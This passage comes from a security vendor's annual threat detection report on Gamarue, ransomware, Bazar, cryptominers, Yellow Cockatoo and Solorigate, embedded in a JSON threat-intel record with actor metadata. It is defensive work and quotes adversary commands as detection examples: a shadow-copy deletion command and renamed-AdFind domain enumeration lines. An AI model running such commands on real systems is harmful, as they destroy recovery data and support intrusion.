ATT&CK and sharing why that’s\n\nuseful. She is also a SANS instructor\n\nand has shared her CTI and ATT&CK\n\nexpertise with presentations at many\n\nconferences as well as through Twitter,\n\nblog posts, and podcasts.\n\n\n-----\n\n###### T H R E AT\n\n##### Gamarue\n\nGamarue is a worm that primarily spreads via USB drives. Despite its command\nand control (C2) infrastructure being disrupted in 2017, Gamarue keeps worming\nits way through many environments.\n\n##### Analysis\n\nGamarue, sometimes referred to as Andromeda or Wauchos, is a malware\n\nfamily used as part of a botnet. The variant of Gamarue that we observed most\n\nfrequently in 2020 was a worm that primarily spread via infected USB drives.\n\nGamarue has been used to spread other malware, steal information, and\n\nperform other activities such as click fraud.\n\nMost Gamarue detections we observed started with a user clicking on a\n\nmalicious LNK file disguised as a legitimate file on a USB drive. This resulted\n\nin execution of the Windows DLL Host (rundll32.exe) attempting to load a\n\nmalicious DLL file. In some environments, the malicious DLL didn’t exist, likely\n\nbecause it was removed by antivirus (AV) or an endpoint protection product.\n\nIt might seem unusual that Gamarue was so prevalent in 2020 given that it was\n\n**[disrupted in 2017. However, its presence in our top 10 threats tells us how](https://www.microsoft.com/security/blog/2017/12/04/microsoft-teams-up-with-law-enforcement-and-other-partners-to-disrupt-gamarue-andromeda/)**\n\npervasive worms can be, even years after takedowns of much of their command\n\nand control (C2) infrastructure. Although Gamarue isn’t as active as it was, we\n\nobserved at least one Gamarue C2 domain that appeared to be active at the\n\ntime of detection in April 2020. This suggests that although Gamarue has been\n\nsignificantly disrupted, it isn’t completely gone, and therefore should still be\n\ntaken seriously.\n\n###### Not dead yet\n\nWith so many threats facing us, USB worms aren’t often the highest priority for\n\nmany security teams, but they are still worth your attention. While we didn’t\n\nsee follow-on activity in most Gamarue detections, the fact that we observed\n\nGamarue in so many environments is significant because it tells us that USB\n\nworms are still a pervasive infection vector that we need to consider as part of\n\nour threat models. While we as security practitioners may think “no one uses\n\nUSB drives anymore,” our analysis shows that’s clearly not the case in many\n\norganizations. Just because we as analysts aren’t excited about USB malware, it\n\ndoesn’t make it any less pervasive.\n\n\n###### OVERALL RANK\n\n#### 5%\n\n###### CUSTOMERS AFFECTED\n\n\n-----\n\n##### Detection opportunities\n\n###### Detection opportunity 1\n\nSpecial characters in rundll32 command line\n\n**ATT&CK technique(s): T1218.011 Signed Binary Proxy Execution: Rundll32**\n\n**ATT&CK tactic(s): Defense Evasion, Execution**\n\n**Details: The main detection analytic that helped us catch so much Gamarue**\n\nwas based on what we noticed about how Gamarue executed rundll32.exe.\n\nAs we examined multiple Gamarue detections over time, we noticed that their\n\n**rundll32.exe command lines consistently used the same number of characters**\n\nin a repeatable pattern—25 characters followed by a period followed by 25\n\nadditional characters, then a comma and 16 more characters. For example:\n\nWe translated this into a regular expression, simplified as: \\[25 ASCII\n\n**characters].[25 ASCII characters],[16 ASCII characters]**\n\n\nDetecting a process of rundll32.exe combined with this regular expression\n\nlooking for multiple special characters in the process command line helped us\n\ncatch Gamarue. This detection analytic is a good example of how intelligence\n\nanalysts can use observations about commonalities in threats over time to\n\ncreate useful analytics:\n\n1. Hey, we see that same pattern with a whole bunch of underscores a lot…\n\nwhat is that?\n\n2. Oh cool, that looks like Gamarue.\n\n3. It keeps doing the same thing. Let’s make an analytic for that!\n\n\n-----\n\n###### Detection opportunity 2\n\nWindows Installer (msiexec.exe) external network connections\n\n**ATT&CK technique(s): T1218.007 Signed Binary Proxy Execution: Msiexec,**\n\nT1055.012 Process Injection: Process Hollowing\n\n**ATT&CK tactic(s): Defense Evasion, Command and Control**\n\n**[Details: We observed Gamarue injecting into the signed Windows Installer](https://blog.avast.com/andromeda-under-the-microscope)**\n\n**msiexec.exe, which subsequently connected to C2 domains. Adversaries**\n\ncommonly use msiexec.exe to proxy the execution of malicious code through\n\na trusted process. We detected Gamarue by looking for msiexec.exe without a\n\ncommand line making external network connections. Though many Gamarue C2\n\nservers were disrupted in 2017, we found that some domains were active in 2020,\n\nlike the one in the following example (4nbizac8[.]ru):\n\nWe could just detect the domain, but as we know, adversaries like to change\n\n[those up (Pyramid of Pain, anyone?), so we found this analytic to be more](http://Pyramid of Pain)\n\ndurable. You’ll have to tune out any legitimate network connections that\n\n**msiexec.exe makes from your network, since every environment is different. If**\n\nyou aren’t excited about detecting Gamarue, don’t worry—this same detection\n\nanalytic also helped us catch other threats such as Zloader throughout 2020.\n\n###### Bonus forensic analysis opportunity\n\nROT13 registry modifications\n\n**ATT&CK technique(s): T1112 Modify Registry**\n\n**ATT&CK tactic(s): Defense Evasion/Execution**\n\n**Details: While this isn’t a detection opportunity, we wanted to share a tip**\n\nfor how we identify the source LNK that executed Gamarue in many of our\n\ndetections. We observed that the parent process of rundll32.exe (often\n\n**explorer.exe) usually creates a registry value in the UserAssist subkey.**\n\n**UserAssist tracks applications that were executed by a user and encodes data**\n\n\n-----\n\nusing the ROT13 cipher. Because Gamarue is often installed by a user clicking\n\nan LNK file, if you’re trying to figure out the source of Gamarue, check out the\n\nregistry key HKEY_USERS\\{SID}\\Software\\​Microsoft\\Windows\\CurrentVersion​\n\n**\\Explorer\\UserAssist for any registry modifications ending in .yax—.yax is the**\n\nROT13 encoded value of .lnk. While this won’t be a good detection opportunity\n\non its own, it could be helpful to look for this registry value if you’re responding\n\nto a Gamarue incident to figure out where it came from and clean the USB drive.\n\n\n###### Katie Nickels\n\n**D I R E C T O R O F**\n**I N T E L L I G E N C E**\n\nKatie has worked in Security\n\nOperations Centers and cyber threat\n\nintelligence for nearly a decade,\n\nhailing from a liberal arts background\n\nwith degrees from Smith College and\n\nGeorgetown University. Prior to joining\n\nRed Canary, Katie was the ATT&CK\n\nThreat Intelligence Lead at The MITRE\n\nCorporation, where she focused on\n\napplying cyber threat intelligence\n\nto ATT&CK and sharing why that’s\n\nuseful. She is also a SANS instructor\n\nand has shared her CTI and ATT&CK\n\nexpertise with presentations at many\n\nconferences as well as through Twitter,\n\nblog posts, and podcasts.\n\n\n-----\n\n###### O N O U R R A D A R\n\n##### Other threats\n\nThis section considers threats that weren’t widespread enough to make our top\nten but deserve attention because of their potential impact, rising prevalence,\nor other factors.\n\n##### Ransomware\n\nWe are pleased that no ransomware family made it into our top 10 (or even our\n\ntop 20) this year. The fact that ransomware precursors like Qbot, Emotet, and\n\nTrickBot made our list—while no actual ransomware families did—suggests\n\nthat we, our customers, and the community are having some success at\n\nresponding before these threats fully materialize. Red Canary did observe\n\nquite a bit of ransomware in 2020, but these cases mainly came in through our\n\nincident response partners, who bring us in to help victims who have already\n\nbeen compromised. While there are detection opportunities for ransomware\n\n[such as looking for volume shadow copy deletion (for example, vssadmin.exe](https://redcanary.com/blog/its-all-fun-and-games-until-ransomware-deletes-the-shadow-copies/)\n\n**Delete Shadows /All /Quiet), we strongly recommend focusing on detecting**\n\nransomware precursors rather than worrying about detecting ransomware\n\nactivity itself.\n\nAmong environments affected with ransomware, the top five families we\n\nobserved were:\n\n- Egregor\n\n- Ryuk\n\n- WannaCry\n\n- Sodinokibi\n\n- Maze\n\nOut of that list, the presence of WannaCry might surprise you, considering it\n\ndid most of its damage in 2017. Its continued prevalence is due to its pervasive\n\nnature as a worm as well as persistence that has lingered on networks years\n\nafter the original outbreak.\n\n\n###### OVERALL RANK\n\n#### 5%\n\n###### CUSTOMERS AFFECTED\n\n\n-----\n\n##### Bazar\n\nA ransomware precursor family that caused us quite a headache but didn’t\n\nmake it into the top 10 was Bazar. Despite being less prevalent than some other\n\nthreats, Bazar is especially noteworthy due to how quickly it progresses to\n\nfollow-on activity leading up to ransomware. While we only observed Bazar\n\nin a few environments early on, we saw a significant surge in September and\n\n[October 2020. For more details on this threat, check out our blog post A Bazar](https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/)\n\n**[start: How one hospital thwarted a Ryuk ransomware outbreak.](https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/)**\n\n##### Blue Mockingbird\n\nAs our Intelligence Team grew and matured in 2020, we began to identify novel\n\nactivity clusters that we were unable to associate with a known threat. Naturally,\n\nas Red Canary, we decided we should name our clusters with a color and a bird.\n\n[One of our first named activity clusters was Blue Mockingbird.](https://redcanary.com/blog/blue-mockingbird-cryptominer/)\n\nWhile we didn’t see Blue Mockingbird in very many environments, when we did\n\nencounter it, we saw a lot of activity. Blue Mockingbird employs quick lateral\n\nmovement to install its cryptomining payload to as many hosts as possible. In\n\nfact, this initial spread and establishment of persistence almost single-handedly\n\npropelled T1543: Windows Service into the #3 spot in our rankings.\n\nBlue Mockingbird mines cryptocurrency, a fairly common objective across\n\nthreats in 2020. In many cases, while we were able to detect suspicious mining\n\nactivity, we couldn’t always associate it to a named threat. Monero (XMR) was\n\nthe primary cryptocurrency of choice for miners, and many threats leveraged\n\n[code from XMRig. If mining cryptocurrency is not part of normal business](https://github.com/xmrig)\n\noperations in your organization, consider building detection logic around\n\n[network connections to domains associated with mining pools to help you](https://monero.org/services/mining-pools/)\n\ndetect Blue Mockingbird and a range of other cryptomining threats.\n\n##### Yellow Cockatoo\n\nYellow Cockatoo was another activity cluster we first encountered in 2020,\n\nbeginning early in the summer. By fall Yellow Cockatoo had burst onto the\n\nscene, placing in our top five most prevalent threats in October, November,\n\nand December. We weren’t the only ones to notice this new threat on the rise—\n\n**[Morphisec published a great profile of this malware in November, giving it the](https://blog.morphisec.com/jupyter-infostealer-backdoor-introduction)**\n\nmoniker “Jupyter Infostealer.” As that name suggests, Yellow Cockatoo falls\n\ninto the category of stealers—its objectives appear to be data exfiltration and\n\nproviding the adversary with remote access to victims. That said, it appears to\n\n\n-----\n\nbe a rather indiscriminate threat, gaining access to a wide array of organizations\n\nthrough its search result sleight-of-hand that tricks users into downloading\n\nand executing malicious code. For more details and detection opportunities,\n\n[check out our blog post from December on how to detect the Yellow Cockatoo](https://redcanary.com/blog/yellow-cockatoo/)\n\n**[remote access trojan.](https://redcanary.com/blog/yellow-cockatoo/)**\n\n##### Solorigate and beyond\n\nA major incident that closed out 2020 was the supply chain compromise\n\nof SolarWinds along with other related activity tracked under the names\n\n[“Solorigate,” “UNC2452,” “Dark Halo,” and multiple malware families. The](https://msrc-blog.microsoft.com/2020/12/21/december-21st-2020-solorigate-resource-center/)\n\nSolarWinds compromise will almost certainly continue to be a challenge\n\nfor defenders to respond to throughout 2021, due to its complexity and\n\ndownstream effects on other organizations. It’s important to remember that this\n\nis now a series of incidents and TTPs that reaches far beyond just SolarWinds.\n\nEach organization should evaluate how they can best protect themselves based\n\non the TTPs that are likely to affect them. For example, a company that makes\n\nsoftware should be concerned about monitoring the integrity of their build\n\nprocesses, which may not be a concern for other organizations.\n\nFor organizations that have endpoint visibility, here is one detection opportunity\n\n(beyond searching for atomic indicators like hashes) for follow-on exploitation\n\nto the SolarWinds compromise. There are plenty of other opportunities for both\n\nendpoint and network detection, many of which have been helpfully compiled\n\n[by MITRE.](https://github.com/center-for-threat-informed-defense/public-resources/blob/master/solorigate/README.md)\n\n**Short title: Renamed AdFind execution**\n\n**ATT&CK technique(s): T1036.003 Masquerading: Rename System Utilities,**\n\n[T1036.005 Masquerading:](https://attack.mitre.org/techniques/T1036/005/) **[Match Legitimate Name or Location, T1069.002](https://attack.mitre.org/techniques/T1036/005/)**\n\n**[Permission Groups Discovery: Domain Groups, T1482 Domain Trust](https://attack.mitre.org/techniques/T1069/002/)**\n\n**[Discovery](https://attack.mitre.org/techniques/T1482/)**\n\n**ATT&CK tactic(s): Execution, Defense Evasion**\n\n**Details:** **[Microsoft reported that the adversaries behind Solorigate used a](https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/)**\n\nrenamed version of AdFind for domain enumeration. The following example\n\nprovided by Microsoft shows AdFind renamed as csrss.exe in an apparent\n\nattempt to masquerade as the Client Server Runtime Subsystem process, as this\n\ncommand identifies domain administrators.\n\n```\nC:\\Windows\\system32\\cmd.exe /C csrss.exe -h\nbreached.contoso[.]com -f (name=”Domain Admins”)\nmember -list | csrss.exe -h breached.contoso[.]\ncom -f objectcategory=* > .\\Mod\\mod1.log\n\n```\n\n-----\n\nVolexity reported the same TTP of renaming AdFind used by the group\n\n[they identify as Dark Halo. In Volexity’s example, Dark Halo used a renamed](https://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/)\n\nversion of AdFind to query Active Directory data. In this example, AdFind was\n\nrenamed sqlceip.exe in an apparent attempt to masquerade as the SQL Server\n\nTelemetry Client.\n\n```\nC:\\Windows\\system32\\cmd.exe /C sqlceip.exe\n-default -f (name=”Organization Management”)\nmember -list | sqlceip.exe -f objectcategory=* >\n.\\SettingSync\\log2.txt\n\n```\n\nBecause the AdFind file is renamed differently in the two examples above, we\n\nrecommend creating an analytic looking for any renamed instance of AdFind.\n\nEvaluating process hashes and/or internal binary metadata is a must when\n\nmasquerading is in play. When a legitimate file has been renamed, identifying\n\na mismatch between the expected filename and the observed filename often\n\nleads to high-fidelity detection.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://resource.redcanary.com/rs/003-YRU-314/images/2021-Threat-Detection-Report.pdf?mkt_tok=MDAzLVlSVS0zMTQAAAF_PIlmhNTaG2McG4X_foM-cIr20UfyB12MIQ10W0HbtMRwxGOJaD0Xj6CRTNg_S-8KniRxtf9xzhz_ACvm_TpbJAIgWCV8yIsFgbhb8cuaZA",
        "https://resource.redcanary.com/rs/003-YRU-314/images/2021-Threat-Detection-Report.pdf"
    ],
    "report_names": [
        "2021-Threat-Detection-Report.pdf?mkt_tok=MDAzLVlSVS0zMTQAAAF_PIlmhNTaG2McG4X_foM-cIr20UfyB12MIQ10W0HbtMRwxGOJaD0Xj6CRTNg_S-8KniRxtf9xzhz_ACvm_TpbJAIgWCV8yIsFgbhb8cuaZA",
        "2021-Threat-Detection-Report.pdf"
    ],
    "threat_actors": [
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e568e9d7-ae94-4ce5-9039-4fd17c731c1d",
            "created_at": "2022-10-25T15:50:23.491763Z",
            "updated_at": "2025-03-27T02:00:55.483586Z",
            "deleted_at": null,
            "main_name": "Blue Mockingbird",
            "aliases": [
                "Blue Mockingbird"
            ],
            "source_name": "MITRE:Blue Mockingbird",
            "tools": [
                "FRP",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "26a04131-2b8c-4e5d-8f38-5c58b86f5e7f",
            "created_at": "2022-10-25T15:50:23.579601Z",
            "updated_at": "2025-03-27T02:00:55.50292Z",
            "deleted_at": null,
            "main_name": "TA551",
            "aliases": [
                "TA551",
                "GOLD CABIN",
                "Shathak"
            ],
            "source_name": "MITRE:TA551",
            "tools": [
                "QakBot",
                "IcedID",
                "Valak",
                "Ursnif"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "98b22fd7-bf1b-41a6-b51c-0e33a0ffd813",
            "created_at": "2022-10-25T15:50:23.688973Z",
            "updated_at": "2025-03-27T02:00:55.524322Z",
            "deleted_at": null,
            "main_name": "APT-C-36",
            "aliases": [
                "APT-C-36",
                "Blind Eagle"
            ],
            "source_name": "MITRE:APT-C-36",
            "tools": [
                "Imminent Monitor"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "5d2bd376-fcdc-4c6a-bc2c-17ebbb5b81a4",
            "created_at": "2022-10-25T16:07:23.667223Z",
            "updated_at": "2025-03-27T02:02:09.916086Z",
            "deleted_at": null,
            "main_name": "GCHQ",
            "aliases": [
                "Government Communications Headquarters",
                "Operation Socialist"
            ],
            "source_name": "ETDA:GCHQ",
            "tools": [
                "Prax",
                "Regin",
                "WarriorPride"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "77b28afd-8187-4917-a453-1d5a279cb5e4",
            "created_at": "2022-10-25T15:50:23.768278Z",
            "updated_at": "2025-03-27T02:00:55.5423Z",
            "deleted_at": null,
            "main_name": "Inception",
            "aliases": [
                "Inception Framework",
                "Cloud Atlas"
            ],
            "source_name": "MITRE:Inception",
            "tools": [
                "PowerShower",
                "VBShower",
                "LaZagne"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "b43e5ea9-d8c8-4efa-b5bf-f1efb37174ba",
            "created_at": "2022-10-25T16:07:24.36191Z",
            "updated_at": "2025-03-27T02:02:10.1909Z",
            "deleted_at": null,
            "main_name": "UNC2452",
            "aliases": [
                "Dark Halo",
                "Nobelium",
                "SolarStorm",
                "StellarParticle",
                "UNC2452"
            ],
            "source_name": "ETDA:UNC2452",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "04e34cab-3ee4-4f06-a6f6-5cdd7eccfd68",
            "created_at": "2022-10-25T16:07:24.578896Z",
            "updated_at": "2025-03-27T02:02:10.286803Z",
            "deleted_at": null,
            "main_name": "TA551",
            "aliases": [
                "Gold Cabin",
                "Monster Libra",
                "Shathak",
                "TA551"
            ],
            "source_name": "ETDA:TA551",
            "tools": [
                "BokBot",
                "CRM",
                "Gozi",
                "Gozi CRM",
                "IceID",
                "IcedID",
                "Papras",
                "Snifula",
                "Ursnif",
                "Valak",
                "Valek"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "70872c3a-e788-4b55-a7d6-b2df52001ad0",
            "created_at": "2023-01-06T13:46:39.18401Z",
            "updated_at": "2025-03-27T02:00:03.01553Z",
            "deleted_at": null,
            "main_name": "UNC2452",
            "aliases": [
                "DarkHalo",
                "StellarParticle",
                "NOBELIUM",
                "Solar Phoenix",
                "Midnight Blizzard"
            ],
            "source_name": "MISPGALAXY:UNC2452",
            "tools": [
                "SNOWYAMBER",
                "HALFRIG",
                "QUARTERRIG"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bd43391b-b835-4cb3-839a-d830aa1a3410",
            "created_at": "2023-01-06T13:46:38.925525Z",
            "updated_at": "2025-03-27T02:00:02.95302Z",
            "deleted_at": null,
            "main_name": "APT-C-36",
            "aliases": [
                "Blind Eagle"
            ],
            "source_name": "MISPGALAXY:APT-C-36",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "90f216f2-4897-46fc-bb76-3acae9d112ca",
            "created_at": "2023-01-06T13:46:39.248936Z",
            "updated_at": "2025-03-27T02:00:03.031127Z",
            "deleted_at": null,
            "main_name": "GOLD CABIN",
            "aliases": [
                "Shakthak",
                "TA551",
                "ATK236",
                "G0127",
                "Monster Libra"
            ],
            "source_name": "MISPGALAXY:GOLD CABIN",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "1d3f9dec-b033-48a5-8b1e-f67a29429e89",
            "created_at": "2022-10-25T15:50:23.739197Z",
            "updated_at": "2025-03-27T02:00:55.536417Z",
            "deleted_at": null,
            "main_name": "UNC2452",
            "aliases": [
                "UNC2452",
                "NOBELIUM",
                "StellarParticle",
                "Dark Halo"
            ],
            "source_name": "MITRE:UNC2452",
            "tools": [
                "Sibot",
                "Mimikatz",
                "Cobalt Strike",
                "AdFind",
                "GoldMax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d706edf6-cb86-4611-99e1-4b464e9dc5b9",
            "created_at": "2023-01-06T13:46:38.839083Z",
            "updated_at": "2025-03-27T02:00:02.93205Z",
            "deleted_at": null,
            "main_name": "INDRIK SPIDER",
            "aliases": [],
            "source_name": "MISPGALAXY:INDRIK SPIDER",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "99cb4e5b-8071-4f9e-aa1d-45bfbb6197e3",
            "created_at": "2023-01-06T13:46:38.860754Z",
            "updated_at": "2025-03-27T02:00:02.937438Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "SectorJ04 Group",
                "Dudear",
                "G0092",
                "ATK103",
                "Hive0065",
                "Spandex Tempest",
                "GRACEFUL SPIDER",
                "GOLD TAHOE",
                "CHIMBORAZO",
                "SectorJ04"
            ],
            "source_name": "MISPGALAXY:TA505",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "50068c14-343c-4491-b568-df41dd59551c",
            "created_at": "2022-10-25T15:50:23.253218Z",
            "updated_at": "2025-03-27T02:00:55.408128Z",
            "deleted_at": null,
            "main_name": "Indrik Spider",
            "aliases": [
                "Indrik Spider",
                "Evil Corp",
                "Manatee Tempest",
                "DEV-0243",
                "UNC2165"
            ],
            "source_name": "MITRE:Indrik Spider",
            "tools": [
                "Mimikatz",
                "PsExec",
                "Dridex",
                "WastedLocker",
                "BitPaymer",
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "63061658-5810-4f01-9620-7eada7e9ae2e",
            "created_at": "2022-10-25T15:50:23.752974Z",
            "updated_at": "2025-03-27T02:00:55.538582Z",
            "deleted_at": null,
            "main_name": "Wizard Spider",
            "aliases": [
                "Wizard Spider",
                "UNC1878",
                "TEMP.MixMaster",
                "Grim Spider",
                "FIN12",
                "GOLD BLACKBURN",
                "ITG23",
                "Periwinkle Tempest",
                "DEV-0193"
            ],
            "source_name": "MITRE:Wizard Spider",
            "tools": [
                "TrickBot",
                "AdFind",
                "BITSAdmin",
                "Bazar",
                "LaZagne",
                "Nltest",
                "GrimAgent",
                "Dyre",
                "Ryuk",
                "Conti",
                "Emotet",
                "Rubeus",
                "Mimikatz",
                "Diavol",
                "PsExec",
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "32a223a8-3c79-4146-87c5-8557d38662ae",
            "created_at": "2022-10-25T15:50:23.703698Z",
            "updated_at": "2025-03-27T02:00:55.528031Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Lazarus Group",
                "Labyrinth Chollima",
                "HIDDEN COBRA",
                "Guardians of Peace",
                "NICKEL ACADEMY",
                "Diamond Sleet"
            ],
            "source_name": "MITRE:Lazarus Group",
            "tools": [
                "RawDisk",
                "Proxysvc",
                "BADCALL",
                "FALLCHILL",
                "WannaCry",
                "HOPLIGHT",
                "TYPEFRAME",
                "Dtrack",
                "HotCroissant",
                "HARDRAIN",
                "Dacls",
                "KEYMARBLE",
                "TAINTEDSCRIBE",
                "AuditCred",
                "netsh",
                "ECCENTRICBANDWAGON",
                "AppleJeus",
                "BLINDINGCAN",
                "ThreatNeedle",
                "Volgmer",
                "Cryptoistic",
                "RATANKBA",
                "Bankshot",
                "Torisma",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f6f91e1c-9202-4497-bf22-9cd5ef477600",
            "created_at": "2023-01-06T13:46:38.86765Z",
            "updated_at": "2025-03-27T02:00:02.938998Z",
            "deleted_at": null,
            "main_name": "WIZARD SPIDER",
            "aliases": [
                "FIN12",
                "UNC2053",
                "Pistachio Tempest",
                "TEMP.MixMaster",
                "GOLD BLACKBURN",
                "Periwinkle Tempest",
                "DEV-0193",
                "Storm-0193",
                "Trickbot LLC",
                "DEV-0237"
            ],
            "source_name": "MISPGALAXY:WIZARD SPIDER",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "5b748f86-ac32-4715-be9f-6cf25ae48a4e",
            "created_at": "2024-06-04T02:03:07.956135Z",
            "updated_at": "2025-03-27T02:05:17.407352Z",
            "deleted_at": null,
            "main_name": "IRON HEMLOCK",
            "aliases": [
                "ATK7 ",
                "Blue Kitsune ",
                "Cozy Bear ",
                "The Dukes",
                "UNC2452 ",
                "YTTRIUM ",
                "APT29 "
            ],
            "source_name": "Secureworks:IRON HEMLOCK",
            "tools": [
                " CozyCar",
                " CozyDuke",
                " DiefenDuke",
                " FatDuke",
                " HAMMERTOSS",
                " LiteDuke",
                " MiniDuke",
                " OnionDuke",
                " PolyglotDuke",
                " RegDuke",
                " RegDuke Loader",
                " SeaDuke",
                " Sliver",
                "CosmicDuke"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "9806f226-935f-48eb-b138-6616c9bb9d69",
            "created_at": "2022-10-25T16:07:23.73153Z",
            "updated_at": "2025-03-27T02:02:09.950784Z",
            "deleted_at": null,
            "main_name": "Indrik Spider",
            "aliases": [
                "Blue Lelantos",
                "DEV-0243",
                "Evil Corp",
                "Gold Drake",
                "Gold Winter",
                "Manatee Tempest",
                "UNC2165"
            ],
            "source_name": "ETDA:Indrik Spider",
            "tools": [
                "Advanced Port Scanner",
                "Agentemis",
                "Babuk",
                "Babuk Locker",
                "Babyk",
                "BitPaymer",
                "Bugat",
                "Bugat v5",
                "Cobalt Strike",
                "CobaltStrike",
                "Cridex",
                "Dridex",
                "EmPyre",
                "EmpireProject",
                "FAKEUPDATES",
                "FakeUpdate",
                "Feodo",
                "FriedEx",
                "Hades",
                "IEncrypt",
                "LINK_MSIEXEC",
                "MEGAsync",
                "Macaw Locker",
                "Metasploit",
                "Mimikatz",
                "PayloadBIN",
                "Phoenix Locker",
                "PowerShell Empire",
                "PowerSploit",
                "PsExec",
                "QNAP-Worm",
                "Raspberry Robin",
                "RaspberryRobin",
                "SocGholish",
                "Vasa Locker",
                "WastedLoader",
                "WastedLocker",
                "cobeacon",
                "wp_encrypt"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "9e767b38-12ae-4ef7-9878-5ce1701066d7",
            "created_at": "2024-05-01T02:03:08.131819Z",
            "updated_at": "2025-03-27T02:05:17.413497Z",
            "deleted_at": null,
            "main_name": "NICKEL ACADEMY",
            "aliases": [
                "COVELLITE ",
                "CTG-2460 ",
                "Diamond Sleet ",
                "Guardians of Peace",
                "HIDDEN COBRA ",
                "High Anonymous",
                "Labyrinth Chollima ",
                "NNPT Group",
                "New Romanic Cyber Army Team",
                "Temp.Hermit ",
                "The Lazarus Group ",
                "UNC577 ",
                "Who Am I?",
                "Whois Team",
                "ZINC ",
                "Black Artemis "
            ],
            "source_name": "Secureworks:NICKEL ACADEMY",
            "tools": [
                " DarkMessenger",
                " Destover",
                " Duuzer",
                " HOPLIGHT",
                " Joanap",
                " KorHigh",
                " LiveJinx",
                " Volgmer",
                "Brambul"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "e6a21528-2999-4e2e-aaf4-8b6af14e17f3",
            "created_at": "2022-10-25T16:07:24.422115Z",
            "updated_at": "2025-03-27T02:02:10.216817Z",
            "deleted_at": null,
            "main_name": "Wizard Spider",
            "aliases": [
                "DEV-0193",
                "Gold Blackburn",
                "Gold Ulrick",
                "Grim Spider",
                "ITG23",
                "Operation BazaFlix",
                "Periwinkle Tempest",
                "TEMP.MixMaster",
                "Wizard Spider"
            ],
            "source_name": "ETDA:Wizard Spider",
            "tools": [
                "AdFind",
                "Agentemis",
                "Anchor_DNS",
                "BEERBOT",
                "BazarBackdoor",
                "BazarCall",
                "BazarLoader",
                "Cobalt Strike",
                "CobaltStrike",
                "Conti",
                "Diavol",
                "Dyranges",
                "Dyre",
                "Dyreza",
                "Dyzap",
                "Gophe",
                "Invoke-SMBAutoBrute",
                "KEGTAP",
                "LaZagne",
                "LightBot",
                "PowerSploit",
                "PowerTrick",
                "PsExec",
                "Ryuk",
                "SessionGopher",
                "TSPY_TRICKLOAD",
                "Team9Backdoor",
                "The Trick",
                "TheTrick",
                "Totbrick",
                "TrickBot",
                "TrickLoader",
                "TrickMo",
                "Upatre",
                "bazaloader",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8bc1a044-a23b-4904-903c-13f463605cb3",
            "created_at": "2024-05-01T02:03:08.136237Z",
            "updated_at": "2025-03-27T02:05:17.415795Z",
            "deleted_at": null,
